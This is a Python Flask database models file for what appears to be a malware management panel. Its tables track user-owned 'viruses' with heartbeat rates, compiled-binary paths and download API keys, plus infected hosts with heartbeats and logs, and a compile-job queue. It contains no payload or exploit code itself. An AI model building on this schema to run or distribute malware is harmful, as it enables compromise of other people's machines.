from . import db
from flask_login import UserMixin
from sqlalchemy.sql import func
from sqlalchemy import event
from sqlalchemy.orm import Session
from datetime import datetime

class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(150), unique=True)
    password = db.Column(db.String(150))
    #Gets refreshed everytime the user logs in 
    token = db.Column(db.String(500), unique=True)

class Virus(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(500))
    heartbeat_rate = db.Column(db.String(500))
    use_case_settings = db.Column(db.String(1000))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    # If virus is not alive it will kill itself upon update and data will be move to archived model db
    is_alive = db.Column(db.Boolean, unique=False, default=True) 
    # Once the virus have been compiled it will be updated with the path of the virus
    storage_path = db.Column(db.String(500))
    # Virus API Handle, once the path is set the virus can be downloaded with a unique API key handle
    virus_api = db.Column(db.String(500), unique=True)

class Hosts(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    host_name = db.Column(db.String(500))
    last_heartbeat = db.Column(db.String(500))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    virus_id = db.Column(db.Integer, db.ForeignKey('virus.id'))
    log_info = db.Column(db.String(500))

class Archived(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    # log_name can be taken out but will do it tomorrow, might break some stuff
    log_name = db.Column(db.String(500))
    virus_id = db.Column(db.Integer, db.ForeignKey('virus.id'))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))

#Handles pending compiling jobs gets saved together when a new virus is made and updated to finished once done
class CompilingHandler(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    virus_id = db.Column(db.Integer, db.ForeignKey('virus.id'))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    # Will either have pending or done
    status = db.Column(db.String(150))
    # Will try to add a functioanlity to display if the compiler is connected and ready for jobs as a nice to have if enough time is left
    last_heartbeat = db.Column(db.String(500))

# Waits for the insert virus to have succesfully inserted to SQL and then saves a test host, but only does it for the first user created
@event.listens_for(Virus, 'after_insert')
def add_default_host(mapper, connection, target):
    print("add_default_host called")
    # Create the default host using a direct connection
    if target.user_id == 1:
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

        connection.execute(
            Hosts.__table__.insert(),
            {
                "host_name": "Test Host",
                "last_heartbeat": str(dt_string),
                "user_id": target.user_id,
                "virus_id": target.id,
                "log_info": "This is a test host automatically generated.",
            }
        )